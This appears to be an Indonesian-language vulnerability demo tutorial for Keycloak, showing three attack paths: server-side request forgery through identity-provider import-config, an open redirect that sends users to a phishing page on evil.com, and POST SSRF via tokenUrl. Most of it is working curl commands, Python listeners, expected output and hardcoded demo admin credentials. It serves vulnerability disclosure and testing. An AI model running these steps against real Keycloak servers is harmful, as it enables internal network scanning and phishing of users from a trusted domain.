# Tutorial: Finding #4 — SSRF + Open Redirect via Identity Provider

**Severity:** HIGH (CVSS 8.0)
**Waktu demo:** ~10 menit
**Kebutuhan:** Terminal + Browser (Admin Console)
**3 Attack Paths:** GET SSRF, Open Redirect, POST SSRF

---

## Skenario Serangan

Attacker yang punya role `manage-identity-providers` (biasa didelegasikan ke team lead untuk SSO setup) bisa:
- **Path A:** Scan jaringan internal via SSRF
- **Path B:** Buat phishing URL dari domain Keycloak yang trusted
- **Path C:** POST data sensitif ke service internal

---

## Langkah 0: Pastikan Keycloak Berjalan

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Langkah 1: Dapatkan Admin Token

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli" \
  -d "grant_type=password" \
  -d "username=admin" \
  -d "password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Token OK: ${ADMIN_TOKEN:0:30}..."
```

---

# PATH A: GET SSRF via import-config

## Langkah A1: Siapkan HTTP Listener (Terminal 1)

Buka terminal baru dan jalankan listener untuk menangkap SSRF request:

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'')
        print(f'=== SSRF TERDETEKSI! ===')
        print(f'Method: {self.command}')
        print(f'Path:   {self.path}')
        print(f'User-Agent: {self.headers.get(\"User-Agent\")}')
        print(f'========================')
        print(f'')
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(b'{\"issuer\":\"https://evil.com\"}')
    def log_message(self, *a): pass
print('Listener siap di port 49990... menunggu SSRF request...')
HTTPServer(('0.0.0.0', 49990), H).serve_forever()
"
```

## Langkah A2: Trigger SSRF (Terminal 2)

Di terminal lain, kirim request import-config dengan `fromUrl` mengarah ke listener kita:

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"providerId":"oidc","fromUrl":"http://127.0.0.1:49990/.well-known/openid-configuration"}' \
  "http://localhost:8080/admin/realms/test/identity-provider/import-config" \
  | python3 -m json.tool
```

## Langkah A3: Lihat Listener (Terminal 1)

**Output di listener:**
```
=== SSRF TERDETEKSI! ===
Method: GET
Path:   /.well-known/openid-configuration
User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.10)
========================
```

> **SSRF CONFIRMED!** Keycloak melakukan server-side HTTP GET ke alamat internal yang kita tentukan. User-Agent menunjukkan ini request dari Java — bukan dari browser user.

---

# PATH B: Open Redirect via kc_idp_hint

## Langkah B1: Register Malicious IdP

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -o /dev/null -w "Register IdP: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "alias": "attacker-idp",
    "providerId": "oidc",
    "enabled": true,
    "config": {
      "authorizationUrl": "https://evil.com/fake-login",
      "tokenUrl": "https://evil.com/token",
      "clientId": "attacker-client",
      "clientSecret": "sec",
      "defaultScope": "openid email profile"
    }
  }' \
  "http://localhost:8080/admin/realms/test/identity-provider/instances"
```
Output: `Register IdP: HTTP 201`

## Langkah B2: Verifikasi IdP Terdaftar di Admin Console

1. Buka: `http://46.101.162.187:8080/admin/master/console/`
2. Login: `admin` / `Admin1234`
3. Realm **test** → **Identity providers**
4. Lihat **attacker-idp** sudah terdaftar dengan `authorizationUrl: https://evil.com/fake-login`

## Langkah B3: Buat Phishing URL

URL ini 100% legitimate Keycloak — tapi akan redirect ke evil.com:

```
http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=test-public&response_type=code&redirect_uri=http://46.101.162.187:8080/realms/test/account&scope=openid&kc_idp_hint=attacker-idp
```

## Langkah B4: Verifikasi Redirect

```bash
curl -si "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=test-public&response_type=code&redirect_uri=http://46.101.162.187:8080/realms/test/account&scope=openid&kc_idp_hint=attacker-idp" \
  2>&1 | grep "Location:"
```

> Redirect chain: Keycloak domain → broker → **evil.com/fake-login**
> Korban melihat URL Keycloak yang trusted, tapi di-redirect ke halaman phishing attacker.

## Langkah B5: Cleanup IdP (setelah demo)

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -o /dev/null -w "Delete IdP: HTTP %{http_code}\n" -X DELETE \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/identity-provider/instances/attacker-idp"
```

---

# PATH C: POST SSRF via tokenUrl

## Langkah C1: Siapkan Listener untuk POST (Terminal 1)

Kill listener lama dulu, lalu jalankan:

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        print(f'')
        print(f'=== POST SSRF TERDETEKSI! ===')
        print(f'Method: POST')
        print(f'Path:   {self.path}')
        print(f'Body:   {body}')
        print(f'User-Agent: {self.headers.get(\"User-Agent\")}')
        print(f'=============================')
        print(f'')
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(b'{\"error\":\"invalid_grant\"}')
    def log_message(self, *a): pass
print('Listener siap di port 49991... menunggu POST SSRF...')
HTTPServer(('0.0.0.0', 49991), H).serve_forever()
"
```

## Langkah C2: Register IdP dengan tokenUrl Internal

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -o /dev/null -w "Register IdP: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "alias": "ssrf-idp",
    "providerId": "oidc",
    "enabled": true,
    "config": {
      "authorizationUrl": "https://evil.com/auth",
      "tokenUrl": "http://127.0.0.1:49991/token",
      "clientId": "attacker",
      "clientSecret": "sec",
      "defaultScope": "openid"
    }
  }' \
  "http://localhost:8080/admin/realms/test/identity-provider/instances"
```

> `tokenUrl` mengarah ke listener kita di `127.0.0.1:49991` — ini target SSRF internal.

## Langkah C3: Trigger POST SSRF via Broker Callback

Ini memerlukan browser session yang aktif. Untuk demo lengkap, buka URL broker endpoint di browser. Keycloak akan POST ke tokenUrl internal saat memproses broker callback.

> **Catatan:** Path C memerlukan browser session aktif. Untuk demo video, Path A dan B sudah cukup menunjukkan vulnerability.

---

## Langkah 9: Jalankan Python PoC (Otomatis Path A + B)

```bash
python3 pocs/poc_f4_ssrf_idp.py --host http://localhost:8080 --listen-port 49990
```

---

## Ringkasan

| Path | Attack | Bukti | Status |
|---|---|---|---|
| A: GET SSRF | import-config fromUrl | Listener menerima GET dari Keycloak | VULNERABLE |
| B: Open Redirect | kc_idp_hint + authorizationUrl | Redirect ke evil.com dari domain trusted | VULNERABLE |
| C: POST SSRF | tokenUrl via broker callback | POST ke alamat internal | VULNERABLE |

**Kesimpulan:** Attacker dengan role `manage-identity-providers` bisa scan jaringan internal, phishing dari domain trusted, dan POST ke service internal.
